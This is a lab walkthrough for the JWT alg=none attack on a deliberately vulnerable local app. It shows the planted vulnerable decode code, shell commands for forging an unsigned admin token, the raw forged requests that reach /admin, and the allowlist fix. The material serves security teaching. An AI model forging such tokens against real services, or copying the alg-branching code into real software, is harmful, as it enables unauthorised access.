# Walkthrough — jwt-none-alg

## 1. Context

The app is a tiny token-based login. Visit `/`, the server hands you a JWT issued under your name (`alice`, `role: user`) — there's no login form, the token is auto-issued so the lab has zero ceremony. From there, two protected endpoints are reachable from Burp:

- `GET /me` — returns the decoded `sub` and `role` claims as plain text. Useful as intermediate feedback: "given this token, who does the server think I am?"
- `GET /admin` — returns the admin panel only if the decoded token has `role=="admin"`, otherwise `403 Forbidden`.

Both endpoints expect the standard `Authorization: Bearer <jwt>` header. Your goal as `alice` (a regular user) is to read `/admin` without an admin's signing key.

## 2. Anatomy of a JWT

You can't exploit what you can't read. Before the first request, internalize the JWT layout — the next steps will edit each piece in turn.

A JWT is three independent segments, glued with dots:

```
<base64url(header)> . <base64url(payload)> . <base64url(signature)>
```

Each segment is base64url-encoded — JSON for the header and payload, raw bytes for the signature. Take the token the home page just issued you. Yours will look like:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.AbxKYDONyz_hh1VurfJ5g_3aaVYKrxs6sofjzj8agW0
```

The signature segment will differ from token to token (it depends on the exact bytes signed), but the header and payload bytes are deterministic given identical JSON. Decoded, the three segments are:

| segment | base64url | JSON |
|---|---|---|
| header | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` | `{"alg":"HS256","typ":"JWT"}` |
| payload | `eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0` | `{"sub":"alice","role":"user"}` |
| signature | `AbxKYDON...` (varies) | HMAC-SHA256 of `header + "." + payload`, keyed with the server's secret |

Two facts to keep in mind:

- **The header announces which algorithm signed the payload.** It is *data from the client side of the wire* — the server reads it, but the server didn't put it there.
- **base64url is not encryption.** It's just a URL-safe encoding; anyone with the token can read its header and payload. The next steps will rewrite both.

### Decoding and re-encoding by hand

Two paths, both shown because you'll switch between them:

**Burp Decoder.** Open the **Decoder** tab → paste a segment → click **Decode as → Base64**. Burp tolerates the missing `=` padding that base64url omits. To re-encode, paste the modified JSON into the top half of Decoder → **Encode as → Base64** → then **manually replace `+` with `-`, `/` with `_`, and strip any trailing `=`**. Burp's plain Base64 encoder isn't URL-safe by default, so those three substitutions are on you.

**Terminal one-liner.** Faster once you've done it twice:

```bash
# decode (suppress padding warnings; base64 -d ignores them on stdout anyway)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

# encode
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
```

The two `tr` calls turn standard base64 output into the URL-safe variant the JWT spec requires. Either path produces identical bytes.

## 3. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The token decode helper looks like this:

```python
def decode(token):
    header = jwt.get_unverified_header(token)
    if header.get("alg") == "none":
        # TODO: remove after local testing — accepts unsigned tokens
        return jwt.decode(token, options={"verify_signature": False})
    return jwt.decode(token, SECRET, algorithms=["HS256"])
```

Two observations to hold in your head before exploiting:

- **The TODO is a confession.** A developer added a path that accepts unsigned tokens "for local testing" and shipped it. Real CVEs in JWT-handling code routinely look exactly like this — the bug is a debug shortcut that survived to production.
- **The decision of *how* to validate the token is keyed off `header["alg"]`** — a value the client put inside the token. The server is asking the token's header "should I check your signature?" and obeying the answer.

The first observation is enough to make the exploit work. The second is the deeper lesson, and we'll come back to it after you've seen the exploit succeed in section 5.

## 4. Exploitation via Burp Suite (primary track)

Configure Burp Proxy and point your browser at it. Visit <http://127.0.0.1:8005/>, capture the `GET /` request in **Proxy → HTTP history**, and copy the JWT from the response body (the page renders it inside a `<div class="token">`). From here on, every request goes through Repeater.

### Step 1 — Confirm /admin rejects your legitimate token

Right-click any captured request to <http://127.0.0.1:8005/> in **HTTP history** → **Send to Repeater**. Edit the Repeater request to:

```
GET /admin HTTP/1.1
Host: 127.0.0.1:8005
Authorization: Bearer <your-legit-token>
```

(Paste the token verbatim — no `Bearer ` prefix inside `<...>`, the prefix already exists.)

Response: `403 Forbidden`. The server validated your token under HS256 (signature OK, decoded `{"sub":"alice","role":"user"}`), then denied access because your role is `user`, not `admin`. This is the legitimate baseline — auth works as designed.

### Step 2 — Forge an alg=none token with role=admin

Build a new token by hand. The three pieces:

```
header     {"alg":"none","typ":"JWT"}
payload    {"sub":"alice","role":"admin"}
signature  (empty)
```

Encode each. With Burp Decoder: paste each JSON, **Encode as → Base64**, strip `=` padding, replace `+`→`-` and `/`→`_`. With the terminal:

```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}'        | base64 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"sub":"alice","role":"admin"}'   | base64 | tr '+/' '-_' | tr -d '=')
echo "${HEADER}.${PAYLOAD}."
```

Either path yields the same string:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.
```

The trailing dot is required — JWT format is always `header.payload.signature` with two dots. The third segment is empty because there is no signature; that's the entire premise of `alg=none`.

### Step 3 — Confirm the forgery via /me first

Send the forged token to `/me` to see what the server *thinks* about it before you swing for `/admin`:

```
GET /me HTTP/1.1
Host: 127.0.0.1:8005
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.
```

Response: `200 OK`, body:

```
sub=alice
role=admin
```

Pause here for one breath. **The server just told you it thinks you're an administrator** based on a token that has no signature. The bytes you sent contain exactly the JSON you wrote — there is no key, nothing was signed. The server simply chose to believe the header.

### Step 4 — Read /admin

Same forged token, different path:

```
GET /admin HTTP/1.1
Host: 127.0.0.1:8005
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.
```

Response: `200 OK`, the admin panel HTML — `Pretend admin key`, pending approvals, system status. You read content scoped to administrators using a token you forged with no key.

## 5. What just happened — the deeper bug

The surface bug — "the app accepts unsigned tokens" — explains what worked. The shape of the bug is bigger than that, and worth a minute of attention because atoms 13 and 14 will exploit other flavors of the same shape.

**This is the first atom in the project where the bug is a crypto-config failure, not an input or logic failure.** In atoms 01–04 the broken thing was concrete: an unsanitized SQL string, an unescaped HTML expression, a missing ownership check, an unrestricted outbound URL. Here the code is full of crypto: secrets, signatures, HMAC. None of it is broken. The problem is that the server agreed to do *no* crypto when the token said so. **Looks-like-crypto is not is-crypto.** A `jwt.decode(...)` call surrounded by a `SECRET` constant and an `algorithms=` parameter looks like a security boundary; if any path through the function returns parsed claims without verifying a signature, it isn't.

**The second observation goes deeper.** Re-read the vulnerable `decode`:

```python
header = jwt.get_unverified_header(token)
if header.get("alg") == "none":
    return jwt.decode(token, options={"verify_signature": False})
return jwt.decode(token, SECRET, algorithms=["HS256"])
```

The validation policy — "do I need a signature here?" — is decided based on a value *inside the token*. The token came from the client. So the **client picks the validation policy.** That's a confused-deputy shape: a privileged actor (the server, deciding whether to trust a token) takes orders from an unprivileged one (the attacker, who wrote the header).

The "accept alg=none" branch is one way to lose that game. Atom 13 (`jwt-weak-secret`) is another, and atom 14 (`jwt-key-confusion`) is a third — neither of those involves `none` at all. The pattern repeats because the JWT spec deliberately puts `alg` in the header and asks libraries to honor it. Every JWT-validating function has to defend against attacker-controlled algorithm selection.

The fix in this atom is one line. The fix for the *class* is one rule: **the server decides which algorithms it accepts, and it does so before reading the token's header.** Whatever the token claims about its own signing algorithm is a hint, not a directive.

## 6. Replay against the fixed app

The fixed app is identical except for the `decode` helper. Take the same forged token from step 2 and send it to port `8105`:

```
GET /admin HTTP/1.1
Host: 127.0.0.1:8105
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.
```

Response: `401 Unauthorized`. **Same bytes, same path, opposite outcome.** The fix removed the `if header["alg"] == "none"` branch (see [`DIFF.md`](./DIFF.md)), so PyJWT's normal HS256 verification runs, sees `alg=none` is not in the allowlist `["HS256"]`, and refuses.

For a complete picture, also issue a *fresh* legitimate token from the fixed app's home page (port 8105) and replay it against `GET /admin` on the same port: still `403`, because role is `user`. The fixed app authenticates legitimate users correctly; what it stopped doing is letting the token's header steer the validation logic.

## 7. Why the fix works

See [`DIFF.md`](./DIFF.md) for the change. The fixed `decode` is one line:

```python
def decode(token):
    return jwt.decode(token, SECRET, algorithms=["HS256"])
```

Three things matter about this form:

- **`algorithms` is a positive list.** PyJWT compares the token's `alg` against the list and rejects anything not in it. `none` isn't in the list, so unsigned tokens fail at the algorithm check before any signature work happens. Adding `"none"` to that list re-introduces the bug.
- **There is no branch on the header.** The server commits to "this endpoint accepts HS256 tokens" before it ever reads the token. The attacker can write whatever they want into `alg` — the server doesn't care, doesn't ask.
- **Blocklisting `none` is not the fix.** A natural-but-wrong alternative is `if header["alg"] == "none": abort()`. That fails to bypasses: case (`"None"`, `"NONE"`, `"nOnE"`), Unicode escapes (`"none"`), and other algorithm-confusion cases that don't involve `none` at all (atom 14, `jwt-key-confusion`, will exploit one). Allowlists are finite; blocklists are guesses.

The general rule, for any JWT decode call you write or audit: pass `algorithms=` as a positive list of exactly the algorithms this endpoint is supposed to accept, and never branch off `header["alg"]` to choose how to validate. The header is data, not policy.
